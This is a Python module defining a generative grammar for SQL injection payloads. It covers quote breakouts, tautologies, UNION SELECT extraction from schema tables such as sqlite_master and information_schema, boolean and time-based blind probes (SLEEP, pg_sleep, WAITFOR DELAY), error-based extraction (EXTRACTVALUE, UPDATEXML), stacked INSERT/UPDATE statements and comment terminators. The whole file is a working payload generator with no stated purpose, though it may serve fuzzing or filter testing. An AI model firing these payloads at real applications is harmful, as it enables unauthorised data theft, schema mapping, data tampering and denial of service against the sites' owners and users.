"""SQL injection grammar — covers tautology, UNION, blind, error-based, stacked."""
from .engine import Grammar

SQL_GRAMMAR = Grammar(
    rules={
        "injection": [
            ["quote", "ws", "tautology", "ws", "comment"],
            ["quote", "ws", "union_query", "ws", "comment"],
            ["quote", "ws", "blind_boolean", "ws", "comment"],
            ["quote", "ws", "blind_time", "ws", "comment"],
            ["quote", "ws", "error_based", "ws", "comment"],
            ["quote", "ws", "stacked", "ws", "comment"],
        ],
        "quote": [
            ["'"], ['"'], ["')"], ["'))"], ["'))'"],
            ["')", "ws"], ["'))--\n'"],
        ],
        "ws": [
            [" "], ["\t"], ["\n"], ["/**/"], ["/*a*/"], [" "], [" "],
        ],
        # --- tautology ---
        "tautology": [
            ["or_kw", "ws", "comparison"],
            ["and_kw", "ws", "comparison"],
            ["or_kw", "ws", "not_kw", "ws", "comparison"],
        ],
        "or_kw": [
            ["OR"], ["or"], ["Or"], ["oR"], ["||"],
        ],
        "and_kw": [
            ["AND"], ["and"], ["And"], ["&&"],
        ],
        "not_kw": [["NOT"], ["not"], [""]],
        "comparison": [
            ["number", "eq_op", "number"],
            ["str_val", "eq_op", "str_val"],
            ["func_val", "eq_op", "number"],
            ["iif_expr"],
            ["exists_expr"],
            ["between_expr"],
            ["in_expr"],
            ["glob_expr"],
        ],
        "eq_op": [["="], ["<>"], ["!="], ["LIKE"], ["GLOB"]],
        "number": [
            ["1"], ["2"], ["0"], ["0x1"], ["1e0"], ["(2-1)"], ["~0&1"],
            ["1.0"], ["TRUE"],
        ],
        "str_val": [["'a'"], ["'1'"], ["CHAR(97)"], ["'x'"]],
        "func_val": [
            ["typeof(1)"], ["iif(1,1,0)"], ["sqlite_version()"],
            ["quote(1)"], ["nullif(1,2)"], ["unicode(49)"],
            ["abs(1)"], ["length('a')"], ["hex(1)"],
        ],
        "iif_expr": [
            ["IIF(", "comparison_simple", ",1,0)=1"],
            ["CASE WHEN ", "comparison_simple", " THEN 1 ELSE 0 END=1"],
        ],
        "comparison_simple": [
            ["1=1"], ["'a'='a'"], ["1 GLOB 1"], ["1 LIKE 1"],
        ],
        "exists_expr": [
            ["EXISTS(SELECT ", "number", ")"],
        ],
        "between_expr": [
            ["number", " BETWEEN 0 AND 2"],
            ["number", " BETWEEN ", "number", " AND ", "number"],
        ],
        "in_expr": [
            ["number", " IN(", "number", ",", "number", ")"],
            ["number", " IN(SELECT ", "number", ")"],
        ],
        "glob_expr": [
            ["'*' GLOB '*'"],
            ["str_val", " GLOB ", "str_val"],
            ["GLOB '*' GLOB '"],
        ],
        # --- union ---
        "union_query": [
            ["UNION", "ws", "SELECT", "ws", "select_list"],
            ["UNION", "ws", "ALL", "ws", "SELECT", "ws", "select_list"],
            ["UNION", "ws", "SELECT", "ws", "select_list", "ws",
             "FROM", "ws", "schema_source"],
        ],
        "select_list": [
            ["NULL"], ["1,2,3"], ["NULL,NULL,NULL"],
            ["col_expr", ",", "col_expr", ",", "col_expr"],
        ],
        "col_expr": [
            ["NULL"], ["number"], ["(", "subquery", ")"],
        ],
        "subquery": [
            ["SELECT ", "data_target", " FROM ", "schema_source", " LIMIT 1"],
            ["SELECT group_concat(", "data_target", ") FROM ", "schema_source"],
        ],
        "data_target": [
            ["table_name"], ["column_name"], ["sql"],
            ["name"], ["tbl_name"], ["@@version"], ["version()"],
            ["user()"], ["database()"], ["current_user"],
        ],
        "schema_source": [
            ["sqlite_master"], ["sqlite_master WHERE type='table'"],
            ["information_schema.tables"],
            ["information_schema.columns"],
            ["pg_tables"], ["pg_catalog.pg_tables"],
            ["sysobjects WHERE xtype='U'"],
        ],
        # --- blind boolean ---
        "blind_boolean": [
            ["and_kw", "ws", "(SELECT SUBSTR((",
             "subquery", "),", "pos", ",1))>", "str_val"],
            ["and_kw", "ws", "(SELECT unicode(SUBSTR((",
             "subquery", "),", "pos", ",1)))>", "number"],
            ["and_kw", "ws", "comparison"],
        ],
        "pos": [["1"], ["2"], ["3"], ["4"], ["5"]],
        # --- blind time ---
        "blind_time": [
            ["and_kw", "ws", "time_func"],
        ],
        "time_func": [
            ["SLEEP(", "delay", ")"],
            ["BENCHMARK(5000000,SHA1('test'))"],
            ["pg_sleep(", "delay", ")"],
            ["WAITFOR DELAY '0:0:", "delay", "'"],
            ["randomblob(300000000)"],
        ],
        "delay": [["5"], ["3"], ["2"], ["10"]],
        # --- error based ---
        "error_based": [
            ["and_kw", "ws", "error_func"],
        ],
        "error_func": [
            ["EXTRACTVALUE(1,CONCAT(0x7e,(", "subquery", ")))"],
            ["UPDATEXML(1,CONCAT(0x7e,(", "subquery", ")),1)"],
            ["CAST((", "subquery", ") AS int)"],
            ["CONVERT(int,(", "subquery", "))"],
            ["EXP(~(SELECT*FROM(SELECT ", "data_target", ")x))"],
        ],
        # --- stacked ---
        "stacked": [
            [";", "ws", "stacked_cmd"],
        ],
        "stacked_cmd": [
            ["SELECT ", "data_target", " FROM ", "schema_source"],
            ["INSERT INTO ", "schema_source", " VALUES(1)"],
            ["UPDATE ", "schema_source", " SET ", "data_target", "=1"],
        ],
        # --- comment ---
        "comment": [
            ["--"], ["-- -"], ["#"], ["/**/"], [""], [";--"], ["--+"],
            ["%00"], [";%00"],
        ],
    },
    start="injection",
)
